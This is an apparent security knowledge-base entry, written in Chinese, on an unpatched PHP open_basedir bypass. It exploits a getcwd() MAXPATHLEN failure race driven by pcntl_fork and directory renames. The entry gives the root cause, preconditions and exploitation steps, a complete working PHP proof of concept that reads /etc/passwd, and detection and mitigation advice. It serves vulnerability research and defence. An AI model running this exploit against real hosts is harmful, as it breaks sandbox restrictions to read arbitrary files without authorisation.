---
id: web-php-open-basedir-bypass-getcwd-race
title: PHP getcwd() 失败竞态绕过 open_basedir（MAXPATHLEN 溢出 + 目录重命名）
type: scenario
domain: web
path: web/php/open-basedir-bypass
technique: php-open-basedir-getcwd-race
aliases:
- getcwd race open_basedir
- GH-21961
- MAXPATHLEN open_basedir bypass
- pcntl_fork 竞态绕过 open_basedir
- open_basedir 条件竞争
severity: high
confidence: high
status: verified
created: '2026-11-04'
updated: '2026-11-05'
tags:
- php
- open_basedir
- bypass
- race-condition
- getcwd
- pcntl
- arbitrary-file-read
cve: []
affected_versions: 'PHP 5.2.5 ~ 8.5、master（PR #21962 未合并）'
verification:
  verified_by: verifier-V10
  verified_at: '2026-11-05T00:50:11+08:00'
  notes: 已对照原文与截图核对 MAXPATHLEN 溢出、VCWD_GETCWD 回退 VCWD_OPEN、rename 竞态与 /etc/passwd 读取结果；未验证点：未在本机复现，原文称竞态可能需多次运行
---

## 一句话结论

运行时 `ini_set('open_basedir', ...)` 的“窄化”校验依赖 `getcwd()` 把相对路径展开为绝对路径；当进程 cwd 路径长度超过 `MAXPATHLEN` 时 `getcwd()` 失败，PHP 会回退为直接 `open()` 相对路径并返回**未经解析**的 `../`，此时 `../` 能通过 `open_basedir` 子路径检查，再配合父进程重命名目录制造竞态，即可跳出限制读取任意文件。

## 原理

- `ZEND_INI_MH(OnUpdateBaseDir)` 在运行时只允许把 `open_basedir` 改得更窄，不允许更宽。判断方式是：对 `ini_set('open_basedir', 'path1:path2')` 中的每个路径调用 `expand_filepath()` 展开为绝对路径，再检查它是否为现有 `open_basedir` 某条路径的子路径。
- `expand_filepath()` 在 `relative_to` 为 NULL 时用 `VCWD_GETCWD()` 获取当前工作目录作为相对路径的基准。`VCWD_GETCWD()` 把 cwd 写入固定大小缓冲区（Linux `MAXPATHLEN` = 4096），当 cwd 路径长度超过缓冲区时返回 NULL。
- 返回 NULL 后，`expand_filepath_with_mode()` 有一个回退分支：用 `VCWD_OPEN(filepath, O_RDONLY)` 直接打开相对路径，让内核解析；打开成功就把**原始相对字符串**复制进结果并返回，而不是返回规范化绝对路径。
- 于是 `expand_filepath('../')` 在竞态窗口内返回 `'../'`。接下来 `php_check_open_basedir_ex('../', 0)` 做前缀判断：只要当前进程还位于 `open_basedir` 允许目录的某个子目录中，`../` 被视为该目录的子路径，检查通过。攻击者随后再 `chdir()` 到父目录，`../` 的相对语义就指向允许目录之外。
- 两个独立缺陷叠加：**`getcwd()` 失败后返回未解析路径**，以及 **ZTS 下 `VCWD_GETCWD()` 的 cwd 可能与真实 cwd 不一致**。竞态由另一个进程（`pcntl_fork()` 子进程）重命名目录实现：把 cwd 中的某层目录名临时改长，使总长度超过 `MAXPATHLEN` 触发 `getcwd()` 失败；再改回原名，使随后的 `open('../')` 成功。

## 触发条件

1. 目标已配置 `open_basedir`（php.ini 或 vhost）。
2. 攻击者可执行任意 PHP 代码。
3. `pcntl_fork()` 可用（需要 pcntl 扩展；CLI 模式默认加载），用子进程制造竞态。
4. Linux 系统 `MAXPATHLEN = 4096`；macOS 为 1024，需要相应调整目录深度参数。
5. `open_basedir` 允许路径内存在可写目录，用于创建超长深目录结构。

## 利用步骤

1. 在允许目录内创建深层目录，使自身 cwd 路径接近但不超过 `MAXPATHLEN`（每层 249 字符 + 分隔符，重复 16 层约 4000 字节）。
2. `pcntl_fork()` 分出父子进程。
3. 子进程反复执行 `ini_set('open_basedir', 原值 . ':../')`；每次触发 `expand_filepath('../')`。
4. 父进程循环把 cwd 路径中的目录名在短名与 250 字符长名之间来回 `rename()`：目录名变长时 cwd 总长超过 4096，`VCWD_GETCWD()` 失败；改回短名时回退 `VCWD_OPEN('../')` 成功，`../` 通过检查。
5. 子进程 `chdir()` 到父目录后读取 `etc/passwd` 一类相对路径，跳出 `open_basedir`。

## PoC

```php
<?php
chdir("/tmp");
@mkdir("poc/");
chdir("poc/");
echo "original basedir: " . ini_get("open_basedir") . "\n";

$magic_depth = str_repeat(str_repeat("a", 249) . "/", 16);
@mkdir($magic_depth, 0755, true);
chdir($magic_depth);

$pid = pcntl_fork();
if ($pid == -1) die;
if ($pid == 0) {                 // 子进程：反复窄化 open_basedir 并读文件
    for ($i = 0; $i < 20; $i++) {
        $cur = ini_get("open_basedir");
        ini_set("open_basedir", $cur . ":../");
    }
    chdir("/tmp");
    chdir("../");
    $passwd = @file_get_contents("etc/passwd");
    if (!$passwd) die("failed\n");
    echo $passwd;
} else {                         // 父进程：重命名目录制造 getcwd 失败窗口
    chdir("/tmp");
    for ($i = 0; $i < 3000; $i++) {
        rename("poc", str_repeat("x", 250));
        rename(str_repeat("x", 250), "poc");
    }
}
```

在 `php:8.3-cli` + pcntl、`open_basedir=/tmp/var/www/html` 的容器中可稳定读出 `/etc/passwd`。竞态成功依赖目录重命名与子进程 `ini_set` 的时序，可能需要多次运行。

## 变体与关联

- 与经典 `chdir()+ini_set()` 手法同源于“运行时 `open_basedir` 窄化检查”，但本手法利用的是 `expand_filepath()` 的回退缺陷与路径长度竞争。
- 同类 TOCTOU 思路也适用于其他依赖 `getcwd()` 做路径规范化的 PHP 组件。
- 该缺陷自 PHP 5.2.5 引入，影响至 8.5，修复 PR 尚未合并。

## 检测与防御

- 升级到包含修复的版本；无法升级时避免在可写目录内运行可执行任意 PHP 代码的业务。
- 禁用 `pcntl_*`（尤其 `pcntl_fork`）与 `ini_set`；限制 Web 进程对目录的 `rename`/`mkdir` 权限。
- 监控短时间内大量 `rename()` 与超长目录名（数百字符重复字符）创建，这是该竞态的高特征行为。
- 根本措施仍是 OS 级隔离：容器、只读挂载、独立低权限用户、`chroot`，不要依赖 `open_basedir` 作为安全边界。
